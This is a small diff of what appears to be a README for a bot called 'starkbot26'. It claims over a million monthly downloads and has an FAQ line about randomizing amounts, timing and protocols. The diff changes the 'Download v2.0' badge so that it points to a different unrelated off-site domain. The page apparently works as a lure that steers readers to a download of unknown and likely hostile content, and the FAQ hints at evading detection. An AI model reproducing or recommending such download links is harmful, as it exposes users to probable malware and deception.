@@ -49,7 +49,7 @@ A: Yes — randomizes amounts, timing, and protocols.
 
 **Monthly downloads:** 1.3m+
 
-[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://forumconnect.uk/starkbot26)
+[![Download](https://img.shields.io/badge/Download-v2.0-brightgreen?style=for-the-badge)](https://connectinstruction.com/starkbot26)
 
 ---
 
